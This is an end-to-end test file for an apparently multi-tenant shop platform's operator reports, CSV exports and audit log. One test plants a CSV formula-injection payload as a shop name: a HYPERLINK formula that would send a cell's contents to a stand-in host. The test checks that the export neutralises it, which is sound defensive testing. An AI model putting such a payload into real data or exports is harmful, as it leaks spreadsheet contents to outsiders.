import 'dotenv/config';
import { randomUUID } from 'node:crypto';
import { type INestApplication } from '@nestjs/common';
import { Test } from '@nestjs/testing';
import { hash } from 'bcryptjs';
import { generate } from 'otplib';
import pg from 'pg';
import { afterAll, beforeAll, describe, expect, it, vi } from 'vitest';
import { PlatformAuditAction } from '@lytronix/validators';
import { AppModule } from '../src/app/app.module';
import { ShopDays } from '../src/modules/reports/services/shop-days';
import { SMS_PROVIDER } from '../src/modules/shared/messaging/tokens';
import { listenOn } from './support/bootstrap';
import { prepareTestDatabase } from './support/database';
import { cookieFrom, getBinary, getJson, postJson, type HttpResult } from './support/http';
import { openShop, type ShopClient } from './support/shop-client';
import { SmsCapture } from './support/sms-capture';

// ADM-08, ADM-09, D8-9 to D8-11, D8-40 to D8-42 (Phase 8 Slice 8.4, read agreed 2026-11-08): each shop's day recorded at
// night, the revenue, shops and top-consumers reports and their CSVs, and the platform audit log's list. Every case
// seeds its own past dates, so other shops in the database never reach its figures. Runs only with
// DATABASE_TEST_ADMIN_URL.
const ADMIN_URL = process.env['DATABASE_TEST_ADMIN_URL'];
const DB_NAME = 'lytronix_reports_test';
const describeIfDatabase = ADMIN_URL ? describe : describe.skip;
vi.setConfig({ testTimeout: 40_000 });

const PASSWORD = 'reports-pass-1';

let app: INestApplication;
let port: number;
let admin: pg.Client;
let appDbUrl = '';
let operator: Record<string, string> = {};
let operatorId = '';
let operatorEmail = '';
const texts = new SmsCapture();

beforeAll(async () => {
  if (!ADMIN_URL) return;
  const urls = await prepareTestDatabase(ADMIN_URL, DB_NAME);
  process.env['DATABASE_URL'] = urls.appDbUrl;
  appDbUrl = urls.appDbUrl;
  process.env['OTP_SECRET'] = 'reports-e2e-otp-secret-0123456789012345678';
  process.env['PLATFORM_DOMAIN'] = 'localhost';
  admin = new pg.Client({ connectionString: urls.adminDbUrl });
  await admin.connect();
  const moduleRef = await Test.createTestingModule({ imports: [AppModule] })
    .overrideProvider(SMS_PROVIDER)
    .useValue(texts.provider)
    .compile();
  ({ app, port } = await listenOn(moduleRef));
  operatorEmail = `operator.${randomUUID().slice(0, 8)}@lytronix.internal`;
  await admin.query(
    'INSERT INTO control.operator_accounts (email, password_hash) VALUES ($1, $2)',
    [operatorEmail, await hash(PASSWORD, 12)],
  );
  const signedIn = await postJson(port, '/auth/operator/signin', {
    email: operatorEmail,
    password: PASSWORD,
  });
  if (!(signedIn.body as { secret?: string }).secret) {
    throw new Error(
      `operator sign-in: ${String(signedIn.status)} ${JSON.stringify(signedIn.envelope)}`,
    );
  }
  const code = await generate({ secret: (signedIn.body as { secret: string }).secret });
  const enrolled = await postJson(port, '/auth/operator/enroll', {
    email: operatorEmail,
    password: PASSWORD,
    code,
  });
  operator = {
    cookie: cookieFrom(enrolled),
    'x-csrf-token': (enrolled.body as { csrfToken: string }).csrfToken,
  };
  operatorId =
    (
      await admin.query<{ id: string }>(
        'SELECT id FROM control.operator_accounts WHERE email = $1',
        [operatorEmail],
      )
    ).rows[0]?.id ?? '';
});

afterAll(async () => {
  if (!ADMIN_URL) return;
  await app.close();
  await admin.end();
});

/** Midday in Dhaka on a day, so the day it falls on is never in doubt. */
const noon = (day: string): string => `${day}T12:00:00+06:00`;

function shop(): Promise<ShopClient> {
  return openShop(port, texts, 'rep');
}

function report(path: string): Promise<HttpResult> {
  return getJson(port, path, operator);
}

async function wallet(
  tenantId: string,
  kind: string,
  amount: string,
  day: string,
  given: { transactionId?: string | null; status?: string; test?: boolean } = {},
): Promise<void> {
  const transactionId =
    given.transactionId === undefined
      ? `TX${randomUUID().slice(0, 10).toUpperCase()}`
      : given.transactionId;
  await admin.query(
    `INSERT INTO control.plan_payments (tenant_id, kind, amount, status, transaction_id, verified_at, quoted_at, test)
     VALUES ($1, $2, $3, $4, $5, $6, $6, $7)`,
    [
      tenantId,
      kind,
      amount,
      given.status ?? 'verified',
      transactionId,
      noon(day),
      given.test ?? false,
    ],
  );
}

async function ledger(tenantId: string, type: string, amount: string, day: string): Promise<void> {
  await admin.query(
    'INSERT INTO tenant.balance_ledger (tenant_id, type, amount, created_at) VALUES ($1, $2, $3, $4)',
    [tenantId, type, amount, noon(day)],
  );
}

async function shopDay(
  tenantId: string,
  day: string,
  given: { state?: string; storage?: number; sms?: number } = {},
): Promise<void> {
  await admin.query(
    `INSERT INTO control.shop_days (tenant_id, day, state, storage_bytes, sms_units) VALUES ($1, $2, $3, $4, $5)`,
    [tenantId, day, given.state ?? 'active', given.storage ?? 0, given.sms ?? 0],
  );
}

async function ownerPhoneOf(tenantId: string): Promise<string | null> {
  const { rows } = await admin.query<{ value: string }>(
    `SELECT i.value FROM control.tenants t
     JOIN control.subscriber_identities i ON i.subscriber_id = t.subscriber_id AND i.kind = 'phone'
     WHERE t.id = $1`,
    [tenantId],
  );
  return rows[0]?.value ?? null;
}

async function shopSlug(tenantId: string): Promise<string | null> {
  const { rows } = await admin.query<{ slug: string }>(
    'SELECT slug FROM control.tenants WHERE id = $1',
    [tenantId],
  );
  return rows[0]?.slug ?? null;
}

interface RevenueFigures {
  wallet: Record<string, string>;
  balance: Record<string, string>;
  givenBack: string;
  earned: string;
}

interface RevenueBody {
  buckets: (RevenueFigures & { from: string; to: string })[];
  total: RevenueFigures;
  recordedSince: string | null;
}

/** Taka written with two decimals, as whole paisa, so sums are exact. */
const paisa = (taka: string): number => Math.round(Number(taka) * 100);

describeIfDatabase("each shop's day, recorded at night (D8-9)", () => {
  it('records its charges by type, what was given back, its SMS units, and its state and plan', async () => {
    const client = await shop();
    const day = '2025-03-15';
    await ledger(client.tenantId, 'sms', '-5.50', day);
    await ledger(client.tenantId, 'verification_fee', '-2.00', day);
    await ledger(client.tenantId, 'plan_payment', '-300.00', day);
    await ledger(client.tenantId, 'reversal', '1.10', day);
    // Not spending: a top-up and an operator's adjustment; and a charge on another day.
    await ledger(client.tenantId, 'top_up', '500.00', day);
    await ledger(client.tenantId, 'adjustment', '-10.00', day);
    await ledger(client.tenantId, 'sms', '-9.99', '2025-03-16');
    for (const [units, status] of [
      [3, 'sent'],
      [2, 'failed'],
    ] as const) {
      await admin.query(
        `INSERT INTO tenant.sms_log (tenant_id, kind, to_phone, units, cost, is_essential, status, created_at)
         VALUES ($1, 'signin_code', '01711000000', $2, '0.55', true, $3, $4)`,
        [client.tenantId, units, status, noon(day)],
      );
    }

    await app.get(ShopDays).recordDay(client.tenantId, day);
    // A second record of the same day replaces the first.
    await app.get(ShopDays).recordDay(client.tenantId, day);
    const { rows } = await admin.query<{
      state: string;
      spend: Record<string, string>;
      given_back: string;
      sms_units: number;
    }>(
      'SELECT state, spend, given_back::text, sms_units FROM control.shop_days WHERE tenant_id = $1',
      [client.tenantId],
    );
    expect(rows).toHaveLength(1);
    expect(rows[0]).toEqual({
      state: 'trial',
      spend: { sms: '5.50', verification_fee: '2.00', plan_payment: '300.00' },
      given_back: '1.10',
      sms_units: 3,
    });
  });

  it("fills in each shop's missing days up to yesterday, once, never before the shop opened", async () => {
    const older = await shop();
    const fresh = await shop();
    await admin.query(
      "UPDATE control.tenants SET created_at = now() - interval '10 days' WHERE id = $1",
      [older.tenantId],
    );
    const count = async (tenantId: string): Promise<number> =>
      Number(
        (
          await admin.query<{ n: string }>(
            'SELECT count(*) AS n FROM control.shop_days WHERE tenant_id = $1',
            [tenantId],
          )
        ).rows[0]?.n ?? 0,
      );
    await app.get(ShopDays).run();
    expect(await count(older.tenantId)).toBe(7);
    expect(await count(fresh.tenantId)).toBe(0);
    await app.get(ShopDays).run();
    expect(await count(older.tenantId)).toBe(7);
  });
});

describeIfDatabase('the revenue report: what was earned (D8-40)', () => {
  it('counts plans and add-ons paid to the wallets and what balances spent, never a top-up, each once', async () => {
    const client = await shop();
    const day = '2024-03-15'; // a Saturday, so its week starts on it
    await wallet(client.tenantId, 'purchase', '300.00', day);
    await wallet(client.tenantId, 'addon', '20.00', day);
    // Not earned here: a top-up (earned when spent), a plan paid from the balance (counted as its spending), one
    // waiting to be checked.
    await wallet(client.tenantId, 'top_up', '500.00', day);
    await wallet(client.tenantId, 'purchase', '300.00', day, { transactionId: null });
    await wallet(client.tenantId, 'renewal', '300.00', day, { status: 'needs_review' });
    await ledger(client.tenantId, 'sms', '-5.50', day);
    await ledger(client.tenantId, 'plan_payment', '-300.00', day);
    await ledger(client.tenantId, 'reversal', '1.10', day);
    await ledger(client.tenantId, 'top_up', '500.00', day);
    await app.get(ShopDays).recordDay(client.tenantId, day);

    const answer = await report(
      '/operator/reports/revenue?dateFrom=2024-03-01&dateTo=2024-03-31&bucket=week',
    );
    expect(answer.status, JSON.stringify(answer.body)).toBe(200);
    const body = answer.body as {
      buckets: (RevenueFigures & { from: string; to: string })[];
      total: RevenueFigures;
      recordedSince: string | null;
    };
    expect(body.total).toEqual({
      wallet: { purchase: '300.00', renewal: '0.00', upgrade: '0.00', addon: '20.00' },
      balance: { sms: '5.50', plan_payment: '300.00' },
      givenBack: '1.10',
      manual: { plans: '0.00', plansReversed: '0.00', topUps: '0.00', topUpsReversed: '0.00' },
      earned: '624.40',
    });
    expect(body.recordedSince).toBe(day);
    // 15 March 2024 is a Friday: its week runs from Saturday the 9th, and every other week earned nothing.
    const week = body.buckets.find((bucket) => bucket.from <= day && bucket.to >= day);
    expect(week).toMatchObject({ from: '2024-03-09', to: day, earned: '624.40' });
    expect(
      body.buckets.filter((bucket) => bucket !== week).every((bucket) => bucket.earned === '0.00'),
    ).toBe(true);
  });

  it('is a CSV too, one row a week and a total, readable as UTF-8', async () => {
    const answer = await getBinary(
      port,
      '/operator/reports/revenue/export?dateFrom=2024-03-01&dateTo=2024-03-31&bucket=week',
      operator,
    );
    expect(answer.status).toBe(200);
    expect(answer.headers['content-type']).toContain('text/csv');
    expect(answer.headers['content-disposition']).toContain(
      'lytro-revenue-2024-03-01-to-2024-03-31-week.csv',
    );
    const text = answer.body.toString('utf8');
    expect(
      text.startsWith(
        '\uFEFFfrom,to,wallet_purchase,wallet_renewal,wallet_upgrade,wallet_addon,balance_plan_payment,',
      ),
    ).toBe(true);
    const lines = text.slice(1).split('\n');
    expect(
      lines
        .find((line) => line.startsWith('2024-03-09,2024-03-15,'))
        ?.endsWith(',1.10,0.00,0.00,0.00,0.00,624.40'),
    ).toBe(true);
    expect(lines.at(-1)?.startsWith('2024-03-01,2024-03-31,300.00,0.00,0.00,20.00,')).toBe(true);
  });

  it("re-slices the same payments by month or by week, the month's total the sum of its weeks (ADM-09)", async () => {
    const client = await shop();
    // July 2024: Monday the 1st, so its first and last weeks are cut to the month.
    await wallet(client.tenantId, 'purchase', '300.00', '2024-07-02');
    await wallet(client.tenantId, 'addon', '20.00', '2024-07-10');
    await wallet(client.tenantId, 'renewal', '450.00', '2024-07-27');
    await ledger(client.tenantId, 'sms', '-5.50', '2024-07-10');
    await ledger(client.tenantId, 'plan_payment', '-300.00', '2024-07-19');
    await ledger(client.tenantId, 'reversal', '1.10', '2024-07-19');
    await ledger(client.tenantId, 'sms', '-2.20', '2024-07-31');
    for (const day of ['2024-07-10', '2024-07-19', '2024-07-31']) {
      await app.get(ShopDays).recordDay(client.tenantId, day);
    }

    const asked = async (bucket: string): Promise<RevenueBody> => {
      const answer = await report(
        `/operator/reports/revenue?dateFrom=2024-07-01&dateTo=2024-07-31&bucket=${bucket}`,
      );
      expect(answer.status, JSON.stringify(answer.body)).toBe(200);
      return answer.body as RevenueBody;
    };
    const byMonth = await asked('month');
    const byWeek = await asked('week');
    expect(byMonth.buckets.map((bucket) => [bucket.from, bucket.to])).toEqual([
      ['2024-07-01', '2024-07-31'],
    ]);
    expect(byWeek.buckets.map((bucket) => [bucket.from, bucket.to])).toEqual([
      ['2024-07-01', '2024-07-05'],
      ['2024-07-06', '2024-07-12'],
      ['2024-07-13', '2024-07-19'],
      ['2024-07-20', '2024-07-26'],
      ['2024-07-27', '2024-07-31'],
    ]);
    // Revenue on several days, in four of the five weeks.
    expect(byWeek.buckets.map((bucket) => bucket.earned)).toEqual([
      '300.00',
      '25.50',
      '298.90',
      '0.00',
      '452.20',
    ]);
    const [month] = byMonth.buckets;
    expect(month?.earned).toBe('1076.60');
    const sumOfWeeks = (figure: (bucket: RevenueFigures) => string | undefined): number =>
      byWeek.buckets.reduce((sum, bucket) => sum + paisa(figure(bucket) ?? '0'), 0);
    expect(sumOfWeeks((bucket) => bucket.earned)).toBe(paisa(month?.earned ?? ''));
    for (const kind of Object.keys(month?.wallet ?? {})) {
      expect(
        sumOfWeeks((bucket) => bucket.wallet[kind]),
        kind,
      ).toBe(paisa(month?.wallet[kind] ?? ''));
    }
    for (const type of Object.keys(month?.balance ?? {})) {
      expect(
        sumOfWeeks((bucket) => bucket.balance[type]),
        type,
      ).toBe(paisa(month?.balance[type] ?? ''));
    }
    expect(sumOfWeeks((bucket) => bucket.givenBack)).toBe(paisa(month?.givenBack ?? ''));
    // Both splits are of the same period, so their totals are one figure.
    expect(byWeek.total).toEqual(byMonth.total);
    expect(byMonth.total).toEqual({
      wallet: { purchase: '300.00', renewal: '450.00', upgrade: '0.00', addon: '20.00' },
      balance: { sms: '7.70', plan_payment: '300.00' },
      givenBack: '1.10',
      manual: { plans: '0.00', plansReversed: '0.00', topUps: '0.00', topUpsReversed: '0.00' },
      earned: '1076.60',
    });
  });

  it('never counts a test payment through a sandbox account, which no money reached (review C, S1)', async () => {
    const tested = await shop();
    const paying = await shop();
    // August 2024. The first shop paid for real only for an add-on; its plan was a sandbox test.
    await wallet(tested.tenantId, 'purchase', '300.00', '2024-08-05', { test: true });
    await wallet(tested.tenantId, 'addon', '20.00', '2024-08-05');
    await wallet(tested.tenantId, 'renewal', '300.00', '2024-08-06', { test: true });
    await wallet(paying.tenantId, 'purchase', '450.00', '2024-08-07');

    const revenue = await report(
      '/operator/reports/revenue?dateFrom=2024-08-01&dateTo=2024-08-31&bucket=month',
    );
    expect(revenue.status, JSON.stringify(revenue.body)).toBe(200);
    expect((revenue.body as RevenueBody).total).toMatchObject({
      wallet: { purchase: '450.00', renewal: '0.00', upgrade: '0.00', addon: '20.00' },
      earned: '470.00',
    });
    // Nor does a test payment make a shop paying: only the shop that paid for real became paying.
    const shops = await report(
      '/operator/reports/shops?dateFrom=2024-08-01&dateTo=2024-08-31&bucket=month',
    );
    expect(shops.status, JSON.stringify(shops.body)).toBe(200);
    expect((shops.body as { total: { becamePaying: number } }).total.becamePaying).toBe(1);
  });
});

describeIfDatabase('the shops report (D8-41)', () => {
  it('counts shops by state and plan now, and each period opened, became paying and lapsed', async () => {
    const first = await shop();
    const second = await shop();
    await admin.query('UPDATE control.tenants SET created_at = $2 WHERE id = $1', [
      first.tenantId,
      noon('2024-04-07'),
    ]);
    await admin.query('UPDATE control.tenants SET created_at = $2 WHERE id = $1', [
      second.tenantId,
      noon('2024-04-16'),
    ]);
    await wallet(first.tenantId, 'purchase', '300.00', '2024-04-10');
    // A later purchase isn't becoming paying again.
    await wallet(first.tenantId, 'purchase', '300.00', '2024-04-20');
    const onPayg = await shop();
    await admin.query("UPDATE control.tenants SET state = 'pay_as_you_go' WHERE id = $1", [
      onPayg.tenantId,
    ]);
    await shopDay(second.tenantId, '2024-04-17', { state: 'active' });
    await shopDay(second.tenantId, '2024-04-18', { state: 'grace' });
    // Still lapsed the next day: it lapsed once.
    await shopDay(second.tenantId, '2024-04-19', { state: 'grace' });

    const answer = await report(
      '/operator/reports/shops?dateFrom=2024-04-01&dateTo=2024-04-30&bucket=month',
    );
    expect(answer.status, JSON.stringify(answer.body)).toBe(200);
    const body = answer.body as {
      now: {
        total: number;
        byState: { state: string; count: number }[];
        byPlan: { planName: string | null; count: number; payAsYouGo: boolean }[];
      };
      total: { opened: number; becamePaying: number; lapsed: number };
    };
    expect(body.total).toEqual({ opened: 2, becamePaying: 1, lapsed: 1 });
    const live = Number(
      (
        await admin.query<{ n: string }>(
          "SELECT count(*) AS n FROM control.tenants WHERE state <> 'deleted'",
        )
      ).rows[0]?.n,
    );
    expect(body.now.total).toBe(live);
    expect(body.now.byState.reduce((sum, row) => sum + row.count, 0)).toBe(live);
    expect(body.now.byPlan.reduce((sum, row) => sum + row.count, 0)).toBe(live);
    // ADM-09, PYG-13: pay-as-you-go is its own line.
    const payg = Number(
      (
        await admin.query<{ n: string }>(
          "SELECT count(*) AS n FROM control.tenants WHERE state = 'pay_as_you_go'",
        )
      ).rows[0]?.n,
    );
    expect(payg).toBeGreaterThan(0);
    expect(body.now.byPlan.filter((row) => row.payAsYouGo).map((row) => row.count)).toEqual([payg]);

    // D8-46, review C's F2: the CSV keeps its period rows, then carries today's counts by state and by plan as the JSON
    // does, pay-as-you-go its own line.
    const csv = await getBinary(
      port,
      '/operator/reports/shops/export?dateFrom=2024-04-01&dateTo=2024-04-30&bucket=month',
      operator,
    );
    expect(csv.status).toBe(200);
    const [movements, states, plansNow, ...rest] = csv.body
      .toString('utf8')
      .slice(1)
      .split('\n\n')
      .map((table) => table.split('\n'));
    expect(rest).toEqual([]);
    expect(movements).toEqual([
      'from,to,opened,became_paying,lapsed',
      '2024-04-01,2024-04-30,2,1,1',
      '2024-04-01,2024-04-30,2,1,1',
    ]);
    expect(states).toEqual([
      'state,shops',
      ...body.now.byState.map((row) => `${row.state},${String(row.count)}`),
    ]);
    expect(plansNow?.[0]).toBe('plan,shops');
    expect(plansNow).toContain(`pay_as_you_go,${String(payg)}`);
    expect(plansNow?.slice(1)).toHaveLength(body.now.byPlan.length);
    expect(plansNow?.slice(1).reduce((sum, row) => sum + Number(row.split(',').at(-1)), 0)).toBe(
      live,
    );
  });
});

describeIfDatabase('the top consumers (D8-10, D8-42)', () => {
  it("ranks shops by SMS, storage and bandwidth, with each owner's phone, and in the CSV", async () => {
    const small = await shop();
    const big = await shop();
    await shopDay(small.tenantId, '2024-05-10', { sms: 10, storage: 500 });
    await shopDay(small.tenantId, '2024-05-11', { sms: 0, storage: 700 });
    await shopDay(big.tenantId, '2024-05-10', { sms: 30, storage: 100 });
    for (const [tenantId, bytes] of [
      [small.tenantId, 1000],
      [big.tenantId, 2000],
    ] as const) {
      await admin.query(
        `INSERT INTO control.media_bandwidth_daily (tenant_id, cycle_start, day, bytes, requests)
         VALUES ($1, $2, '2024-05-10', $3, 1)`,
        [tenantId, noon('2024-05-01'), bytes],
      );
    }
    const top = async (
      metric: string,
    ): Promise<{ id: string; value: number; ownerPhone: string | null }[]> => {
      const answer = await report(
        `/operator/reports/consumers?dateFrom=2024-05-01&dateTo=2024-05-31&metric=${metric}`,
      );
      expect(answer.status, JSON.stringify(answer.body)).toBe(200);
      return (answer.body as { shops: { id: string; value: number; ownerPhone: string | null }[] })
        .shops;
    };
    expect((await top('sms')).map((row) => [row.id, row.value])).toEqual([
      [big.tenantId, 30],
      [small.tenantId, 10],
    ]);
    // Storage as last recorded in the period.
    expect((await top('storage')).map((row) => [row.id, row.value])).toEqual([
      [small.tenantId, 700],
      [big.tenantId, 100],
    ]);
    const bandwidth = await top('bandwidth');
    expect(bandwidth.map((row) => [row.id, row.value])).toEqual([
      [big.tenantId, 2000],
      [small.tenantId, 1000],
    ]);
    const phone = await ownerPhoneOf(big.tenantId);
    expect(phone).not.toBeNull();
    expect(bandwidth[0]?.ownerPhone).toBe(phone);
    // Review C's F6: a seller may type any shop name, a spreadsheet formula too.
    await admin.query('UPDATE control.tenants SET shop_name = $2 WHERE id = $1', [
      big.tenantId,
      '=HYPERLINK("https://x.example/?p="&C2,"Fashion")',
    ]);

    const csv = await getBinary(
      port,
      '/operator/reports/consumers/export?dateFrom=2024-05-01&dateTo=2024-05-31&metric=sms',
      operator,
    );
    expect(csv.status).toBe(200);
    // D8-42 (the owner's pick): each row carries the owner's phone.
    const rows = csv.body.toString('utf8').slice(1).split('\n');
    expect(rows[0]).toBe('shop,address,owner_phone,sms_units');
    expect(rows.slice(1).some((row) => row.includes(`,${phone ?? 'none'},30`))).toBe(true);
    // The name reaches the operator's spreadsheet as text, never a formula it runs (review C, F6).
    const slug = (await shopSlug(big.tenantId)) ?? '';
    expect(rows[1]).toBe(
      `"'=HYPERLINK(""https://x.example/?p=""&C2,""Fashion"")",${slug},${phone ?? ''},30`,
    );
    // D8-46: and a total.
    expect(rows.at(-1)).toBe('total,,,40');
    expect(csv.headers['content-disposition']).toContain(
      'lytro-consumers-2024-05-01-to-2024-05-31-sms.csv',
    );
  });
});

describeIfDatabase('the platform audit log (ADM-08, D8-11)', () => {
  it('lists entries by shop, action and day, newest first, a page at a time, with the operator', async () => {
    const first = await shop();
    const second = await shop();
    const entry = async (action: string, tenantId: string, at: string): Promise<void> => {
      await admin.query(
        `INSERT INTO control.platform_audit_log (actor_type, actor_id, action, target_type, target_id, result, summary, created_at)
         VALUES ('operator', $1, $2, 'tenant', $3, 'success', '{"reason":"test"}', $4)`,
        [operatorId, action, tenantId, at],
      );
    };
    await entry(PlatformAuditAction.TenantSuspended, first.tenantId, noon('2024-06-01'));
    await entry(PlatformAuditAction.TenantRestored, first.tenantId, noon('2024-06-02'));
    await entry(PlatformAuditAction.TenantSuspended, second.tenantId, noon('2024-06-02'));

    const list = async (
      query: string,
    ): Promise<{
      items: {
        action: string;
        actorEmail: string | null;
        shop: { id: string } | null;
        id: number;
      }[];
      next: number | null;
    }> => {
      const answer = await report(`/operator/audit?${query}`);
      expect(answer.status, JSON.stringify(answer.body)).toBe(200);
      return answer.body as {
        items: {
          action: string;
          actorEmail: string | null;
          shop: { id: string } | null;
          id: number;
        }[];
        next: number | null;
      };
    };
    const ofFirst = await list(`tenantId=${first.tenantId}`);
    expect(ofFirst.items.map((item) => item.action)).toEqual([
      'tenant_restored',
      'tenant_suspended',
    ]);
    expect(ofFirst.items[0]).toMatchObject({
      actorEmail: operatorEmail,
      shop: { id: first.tenantId },
    });

    const suspendedThatDay = await list(
      'action=tenant_suspended&dateFrom=2024-06-02&dateTo=2024-06-02',
    );
    expect(suspendedThatDay.items.map((item) => item.shop?.id)).toEqual([second.tenantId]);

    const page1 = await list(`tenantId=${first.tenantId}&limit=1`);
    expect(page1.items).toHaveLength(1);
    expect(page1.next).not.toBeNull();
    const page2 = await list(`tenantId=${first.tenantId}&limit=1&cursor=${String(page1.next)}`);
    expect(page2.items.map((item) => item.action)).toEqual(['tenant_suspended']);
    expect(page2.next).toBeNull();
  });

  it("narrows to one operator's entries, alone or with a shop (ADM-08)", async () => {
    const target = await shop();
    const other = await shop();
    const colleague = (
      await admin.query<{ id: string }>(
        'INSERT INTO control.operator_accounts (email, password_hash) VALUES ($1, $2) RETURNING id',
        [`colleague.${randomUUID().slice(0, 8)}@lytronix.internal`, 'not-a-real-hash'],
      )
    ).rows[0]?.id;
    const entry = async (actorId: string, action: string, tenantId: string): Promise<void> => {
      await admin.query(
        `INSERT INTO control.platform_audit_log (actor_type, actor_id, action, target_type, target_id, result, summary, created_at)
         VALUES ('operator', $1, $2, 'tenant', $3, 'success', '{"reason":"test"}', $4)`,
        [actorId, action, tenantId, noon('2024-06-10')],
      );
    };
    await entry(colleague ?? '', PlatformAuditAction.TenantSuspended, target.tenantId);
    await entry(colleague ?? '', PlatformAuditAction.TenantRestored, other.tenantId);
    await entry(operatorId, PlatformAuditAction.TenantSuspended, target.tenantId);

    const listed = async (query: string): Promise<{ actorId: string; action: string }[]> => {
      const answer = await report(`/operator/audit?${query}`);
      expect(answer.status, JSON.stringify(answer.body)).toBe(200);
      return (answer.body as { items: { actorId: string; action: string }[] }).items;
    };
    const theirs = await listed(`actorId=${colleague ?? ''}`);
    expect(theirs.map((item) => item.action)).toEqual(['tenant_restored', 'tenant_suspended']);
    expect(theirs.every((item) => item.actorId === colleague)).toBe(true);
    const theirsHere = await listed(`actorId=${colleague ?? ''}&tenantId=${target.tenantId}`);
    expect(theirsHere.map((item) => [item.actorId, item.action])).toEqual([
      [colleague, 'tenant_suspended'],
    ]);
    const mineHere = await listed(`actorId=${operatorId}&tenantId=${target.tenantId}`);
    expect(mineHere.map((item) => [item.actorId, item.action])).toEqual([
      [operatorId, 'tenant_suspended'],
    ]);
  });

  it("can't be edited or deleted by the server's own database role (ADM-08)", async () => {
    const client = await shop();
    const written = await admin.query<{ id: string }>(
      `INSERT INTO control.platform_audit_log (actor_type, actor_id, action, target_type, target_id, result, summary)
       VALUES ('operator', $1, 'tenant_suspended', 'tenant', $2, 'success', '{"reason":"kept"}') RETURNING id`,
      [operatorId, client.tenantId],
    );
    const id = written.rows[0]?.id;
    const server = new pg.Client({ connectionString: appDbUrl });
    await server.connect();
    try {
      const refusal = async (statement: string): Promise<string | undefined> => {
        try {
          await server.query(statement, [id]);
          return undefined;
        } catch (error) {
          return (error as { code?: string }).code;
        }
      };
      // 42501: permission denied -- the role has SELECT and INSERT only.
      expect(
        await refusal(
          `UPDATE control.platform_audit_log SET result = 'failure', summary = '{"reason":"changed"}' WHERE id = $1`,
        ),
      ).toBe('42501');
      expect(await refusal('DELETE FROM control.platform_audit_log WHERE id = $1')).toBe('42501');
    } finally {
      await server.end();
    }
    const kept = await admin.query<{ result: string; summary: unknown }>(
      'SELECT result, summary FROM control.platform_audit_log WHERE id = $1',
      [id],
    );
    expect(kept.rows).toEqual([{ result: 'success', summary: { reason: 'kept' } }]);
  });

  it('lists a payment approved or rejected under its shop, which only its summary names (ADM-08, review B F2)', async () => {
    const client = await shop();
    const other = await shop();
    const submit = async (tenantId: string, amount: string): Promise<string> => {
      const made = await admin.query<{ id: string }>(
        `INSERT INTO control.plan_payments (tenant_id, kind, amount, status, transaction_id, submitted_at)
         VALUES ($1, 'top_up', $2, 'pending', $3, now()) RETURNING id`,
        [tenantId, amount, `TX${randomUUID().replace(/-/g, '').slice(0, 10).toUpperCase()}`],
      );
      return made.rows[0]?.id ?? '';
    };
    const approved = await submit(client.tenantId, '500.00');
    const rejected = await submit(client.tenantId, '250.00');
    const elsewhere = await submit(other.tenantId, '700.00');
    const approve = (id: string) =>
      postJson(port, `/operator/payment-queue/${id}/approve`, {}, operator);
    for (const answer of [
      await approve(approved),
      await postJson(
        port,
        `/operator/payment-queue/${rejected}/reject`,
        { note: 'No such transaction at bKash' },
        operator,
      ),
      await approve(elsewhere),
    ]) {
      expect(answer.status, JSON.stringify(answer.body)).toBe(201);
    }

    const answer = await report(`/operator/audit?tenantId=${client.tenantId}`);
    expect(answer.status, JSON.stringify(answer.body)).toBe(200);
    const items = (
      answer.body as {
        items: {
          action: string;
          targetType: string | null;
          targetId: string | null;
          shop: { id: string } | null;
        }[];
      }
    ).items;
    expect(items.map((item) => [item.action, item.targetType, item.targetId])).toEqual([
      ['plan_payment_rejected', 'plan_payment', rejected],
      ['plan_payment_verified', 'plan_payment', approved],
    ]);
    expect(items.every((item) => item.shop?.id === client.tenantId)).toBe(true);
    // The unfiltered log names the shop too.
    const all = await report(`/operator/audit?action=plan_payment_verified&limit=5`);
    const verified = (
      all.body as { items: { targetId: string | null; shop: { id: string } | null }[] }
    ).items;
    expect(verified.find((item) => item.targetId === elsewhere)?.shop?.id).toBe(other.tenantId);
  });
});

describeIfDatabase('who may read them', () => {
  it('refuses a seller and anyone signed out, and a period that ends before it starts', async () => {
    const seller = await shop();
    expect((await getJson(port, '/operator/reports/revenue')).status).toBe(401);
    expect([401, 403]).toContain((await seller.get('/operator/reports/revenue')).status);
    expect((await getJson(port, '/operator/audit')).status).toBe(401);
    const backwards = await report(
      '/operator/reports/revenue?dateFrom=2024-03-31&dateTo=2024-03-01',
    );
    expect(backwards.status).toBe(400);
  });
});
